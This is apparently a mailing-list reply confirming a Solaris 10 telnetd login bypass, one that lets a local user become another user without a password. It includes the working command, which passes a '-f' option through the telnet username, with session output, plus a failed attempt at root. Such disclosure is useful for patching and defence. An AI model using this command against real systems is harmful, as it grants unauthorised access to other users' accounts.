Confirmed.

If the server permits logins from outside (maybe via SSH only - protection 
provided by a local or network) and has telnetd enabled any user can login  
as other user with no password. I mean:

$> ssh user1@...10_server.dom
password: ********
user1@...10_server>telnet -l "-fuser2" localhost
<no pass required>
user2@...10_server>

On my Solaris 10 server I wasn't able to obtain root privileges this way, 
trying:

$>telnet -l "-froot" localhost (or IP from the local net)

I got:

Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
Not on system console
Connection to localhost closed by foreign host.


It seems that root cannot login on not-system consoles. This server hosts 
SunRay Server Software 3.1, maybe the different configuration is coming from 
there.

See you
